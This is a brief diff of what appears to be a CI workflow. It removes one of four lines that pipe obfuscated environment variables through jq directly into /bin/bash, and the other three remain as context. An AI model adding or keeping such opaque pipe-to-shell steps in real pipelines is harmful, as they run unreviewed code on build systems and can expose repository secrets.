@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$txcla61" | jq -r .dckb825 | /bin/bash
           printf '%s' "$urndz94539" | jq -r .hyz492 | /bin/bash
           printf '%s' "$qkkf2" | jq -r .j365 | /bin/bash
-          printf '%s' "$vxz1" | jq -r .m70 | /bin/bash
 
       - name: Store results
         if: always()
